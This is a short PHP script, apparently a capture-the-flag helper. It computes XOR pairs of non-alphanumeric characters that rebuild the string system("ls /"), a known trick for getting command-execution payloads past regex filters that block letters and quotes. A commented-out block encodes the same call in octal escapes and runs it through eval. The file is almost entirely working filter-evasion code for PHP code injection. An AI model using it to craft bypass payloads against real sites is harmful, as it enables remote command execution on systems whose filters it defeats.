<?php
    $reg1='/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/';
    $reg2='/[ \t\r\n\'\"\`\[\]]/';
    $str="system(\"ls /\")";
    for ($i=0; $i <strlen($str) ; $i++) {
        $char=substr($str,$i,1);
        if (preg_match($reg1,$char)||preg_match($reg2,$char)) {
            for ($j=0x20; $j<0x7f ; $j++) {
                if(preg_match($reg1,chr($j))||preg_match($reg2,chr($j)))
                   continue;
                if(!preg_match($reg1,chr(ord($char)^$j))&&!preg_match($reg2,chr(ord($char)^$j))){
                    echo dechex(ord($char)^$j)."(".chr(ord($char)^$j).")^".dechex($j)."(".chr($j).")=";
                    echo dechex(ord($char))."(".$char.")\n";
                    break;
                }
            }
        }
    }
        /*
        for ($j=0; $j <0x7f ; $j++) {
            
            if (!preg_match($reg,$s)) {
                echo substr($str,$i,1)."=".dechex(ord(substr($str,$i,1)))." XOR ".dechex($j)."=".$s."\n";
                break;
            } 
            
        }
        #echo dechex(ord(substr($str,$i,1)));
    }
    echo dechex(~ord(' '))."\n";
    echo dechex(ord(' ')^0);
 */
/*
    $content="\123\131\123\124\105\115\50\42\154\163\40\57\42\51";
    echo urlencode($content);
    eval('echo '.$content.';');
*/

?>